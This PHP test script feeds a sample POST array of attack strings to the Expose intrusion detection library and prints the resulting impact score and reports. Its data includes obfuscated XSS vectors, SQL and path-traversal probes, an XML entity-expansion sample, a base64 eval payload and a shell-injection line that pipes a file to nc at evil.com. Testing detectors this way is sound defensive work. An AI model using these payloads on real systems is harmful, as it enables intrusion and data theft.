<?php
require_once ('vendor/autoload.php');
$data = array(
        'POST' => array(
            /**/
            'test1' => 'foo',
            //'test2' => 'foo<script>nose</script>',
            'bar' => array(
                'baz' => '%3C%69%6D%67%20%73%72%63%3D%22%22%20%6F%6E%65%72%72%6F%72%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%22%3E',
                //'testing' => '<script>test</script>',
                'path' => '../nose/aqui'
            ),
            /**/
            'data' => array(
                '1' => 'bah"></a>',    //rule 1: html escape
                '21' => '%22+onMouseOver%3D%22alert%28', //rule 21: basic XSS probings
                '3' => '>aabbcc</abc>', //rule 3: finds unquoted attribute breaking injections
                '4' => '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
                '5' => '<IMG SCR=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
                '6' => '<iframe src=http://ha.ckers.org/scriptlet.html <',
                '7' => '<<SCRIPT>alert("XSS");//<</SCRIPT>',
                '8' => '<<SCRIPT>prompt("XSS");//<</SCRIPT>',
                '9'=>'<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>',
                '10'=>"';alert(String.fromCharCode(88,83,83))",
                '11'=>'<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>',
                '76'=>'union select from',
                'xmlexp'=>'<!DOCTYPE root [<!ENTITY a "Ha !">]><root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>',
                'shell'=>'foo || cat /etc/password | nc evil.com',
                'eval' => '<% 1=1;eval(gzinflate(base64_decode(("PHNjcmlwdCBzcmM9Imh0dHA6Ly93d3cubm9zZS5jb24vZXZpbC5waHAiPjwvc2NyaXB0Pn==")'
            )
        ),
    );

/**
    echo '<h2>Examples taken from <a href="https://www.awnage.com/2014/01/06/ids-showdown-phpids-vs-expose/">https://www.awnage.com/2014/01/06/ids-showdown-phpids-vs-expose/</a></h2>';
    echo '<pre>';
    echo <<<EOF
    Test  PHPIDS expose
       1:     11     4
      21:      3     3
       3:      2     2
       4:     51     5  *
       5:      9     5
       6:     13    13
       7:     29    18
       8:     29    18
       9:     24     0  *
      10:     32    13  *
      11:     11     0  *
      76:     20    20
      xmlexp: 16    11  *
      shell:  10    10
      TOTAL  260   140 
EOF;
    echo '</pre>';
    /**/

// Cache
$cache = new \Expose\Cache\File();
$cache->setPath( dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cache_tmp');


$filters = new \Expose\FilterCollection();
$filters->setCache($cache);
$filters->load();

//instantiate a PSR-3 compatible logger
//$logger = new \Expose\Log\Mongo();
$logger = new \Expose\Log\File();
$manager = new \Expose\Manager($filters, $logger);
//setting cache
$manager->setCache($cache);
$manager->run($data);

echo 'impact: '.$manager->getImpact()."\n"; // should return 8

// get all matching filter reports
$reports = $manager->getReports();
print_r($reports);

// export out the report in the given format ("text" is default)
echo $manager->export();
echo "\n\n";